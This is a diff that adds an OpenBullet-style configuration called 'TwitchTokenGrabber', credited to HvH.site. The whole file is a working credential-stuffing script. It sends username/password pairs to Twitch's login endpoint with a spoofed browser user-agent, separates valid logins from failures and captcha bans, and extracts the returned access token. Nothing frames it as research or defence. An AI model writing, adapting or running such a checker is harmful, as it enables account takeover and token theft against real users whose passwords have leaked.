@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "TwitchTokenGrabber",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-24T23:35:33.303393+01:00",
+  "AdditionalInfo": "",
+  "Author": "HvH.site",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#HvH.site REQUEST POST "https://passport.twitch.tv/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.twitch.tv" 
+  HEADER "referer: https://www.twitch.tv/" 
+
+#HvH.site KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "user credentials incorrect" 
+    KEY "invalid password" 
+    KEY "no account linked to email or phone number" 
+    KEY "multiple accounts linked to email" 
+  KEYCHAIN Ban OR 
+    KEY "captcha incorrect" 
+
+#HvH.site PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> CAP "token" 
+
